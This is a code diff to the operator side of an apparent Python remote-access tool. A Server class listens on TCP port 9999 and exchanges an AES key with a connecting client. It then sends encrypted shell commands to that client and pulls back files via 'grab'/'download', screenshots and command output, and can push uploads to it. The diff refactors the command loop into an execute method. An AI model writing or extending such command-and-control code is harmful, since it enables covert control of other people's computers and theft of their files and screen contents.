@@ -1,17 +1,27 @@
 import os
 import socket
+import time
 from threading import Thread
 from pynput.keyboard import *
-from helper_methods import *
+from bin.helper_methods import *
 
 
 class Server(Thread):
     def __init__(self):
         self.controller = Controller()
         self.conn = socket.socket()
-        self.conn.bind(("10.0.0.19", 9999))
-        self.conn.listen(1)
-        print('[+] Listening for income TCP connection on port 8080')
+        self.conn.bind(("10.0.0.18", 9999))
+        self.conn.listen(100)
+        print('[+] Listening for income TCP connection on port 9999')
+        self.command = ''
+        self.commands = []
+        self.ind = 0
+        self.current_input = ''
+        self.cwd = os.path.abspath('.')
+        th = Thread(target=self.key_event)
+        th.start()
+
+    def connect(self, *kwargs):
         self.conn, addr = self.conn.accept()
         print('[+]We got a connection from', addr)
         self.conn.send(AESFunc_server(enc_key.encode('ISO-8859-1', errors='ignore')))
@@ -21,11 +31,6 @@ class Server(Thread):
                 break
             except Exception:
                 continue
-        self.commands = []
-        self.ind = 0
-        self.current_input = ''
-        th = Thread(target=self.key_event)
-        th.start()
 
     def download(self, command):
         self.conn.send(encrypt_server(command.encode('ISO-8859-1', errors='ignore')))
@@ -43,11 +48,9 @@ class Server(Thread):
             if bits.endswith('DONE'.encode('ISO-8859-1', errors='ignore')):
                 f.write(bits[:-4])
                 f.close()
-                print('[+] Transfer completed ')
-                break
+                return '[+] Transfer completed '
             if 'File not found'.encode('ISO-8859-1', errors='ignore') in bits:
-                print('[-] Unable to find the file')
-                break
+                return '[-] Unable to find the file'
             f.write(bits)
 
     def upload(self, command):
@@ -61,43 +64,43 @@ class Server(Thread):
                 self.conn.send(packet)
                 packet = f.read(1024)
             self.conn.send('DONE'.encode('ISO-8859-1', errors='ignore'))
-            print('[+] Transfer completed!')
+            return '[+] Transfer completed!'
         else:
             self.conn.send('File not found'.encode('ISO-8859-1', errors='ignore'))
+            return 'File not found'
 
-    def run(self):
-        while True:
-            command = input(self.cwd + ' ')
-            self.SaveObject(command)
-            print(command)
-            if 'cd' in command:
-                self.conn.send(encrypt_server(command.encode('ISO-8859-1')))
-                res = decrypt_server(self.conn.recv(1024)).decode('ISO-8859-1')
-                if '[+]' in res:
-                    self.cwd = res[11:]
-            elif 'terminate' in command:
-                self.conn.send(encrypt_server('terminate'.encode('ISO-8859-1')))
-                self.__init__()
-            elif 'grab' in command or 'download' in command:
-                self.download(command)
-            elif 'screenshot' == command:
-                self.download(command)
-            elif 'send' in command or 'upload' in command:
-                try:
-                    self.upload(command)
-                except Exception as e:
-                    print(e)
-            elif command == '':
-                continue
-            else:
-                try:
-                    self.conn.send(encrypt_server(command.encode('ISO-8859-1', errors='ignore')))
-                    length = int(decrypt_server(self.conn.recv(1024)).decode('ISO-8859-1', errors='ignore'))
-                    print(decrypt_server(self.conn.recv(16+length)).decode('ISO-8859-1', errors='ignore'))
-                except ValueError:
-                    continue
-                except (ConnectionResetError, ConnectionAbortedError):
-                    self.__init__()
+    def execute(self):
+        self.SaveObject(self.command)
+        print(self.command)
+        if 'cd' in self.command:
+            self.conn.send(encrypt_server(self.command.encode('ISO-8859-1')))
+            res = decrypt_server(self.conn.recv(1024)).decode('ISO-8859-1')
+            if '[+]' in res:
+                self.cwd = res[11:]
+            return res
+        elif 'terminate' in self.command:
+            self.conn.send(encrypt_server('terminate'.encode('ISO-8859-1')))
+            self.connect()
+        elif 'grab' in self.command or 'download' in self.command:
+            self.download(self.command)
+        elif 'screenshot' == self.command:
+            self.download(self.command)
+        elif 'send' in self.command or 'upload' in self.command:
+            try:
+                self.upload(self.command)
+            except Exception as e:
+                return e
+        elif self.command == '':
+            return ''
+        else:
+            try:
+                self.conn.send(encrypt_server(self.command.encode('ISO-8859-1', errors='ignore')))
+                length = int(decrypt_server(self.conn.recv(1024)).decode('ISO-8859-1', errors='ignore'))
+                return decrypt_server(self.conn.recv(16 + length)).decode('ISO-8859-1', errors='ignore')
+            except ValueError:
+                return 'Value Error'
+            except (ConnectionResetError, ConnectionAbortedError):
+                self.connect()
 
     def on_press(self, key):
         if key == Key.up:
@@ -169,7 +172,7 @@ class Server(Thread):
 
 def main():
     server = Server()
-    server.run()
 
 
-main()
+if __name__ == '__main__':
+    main()
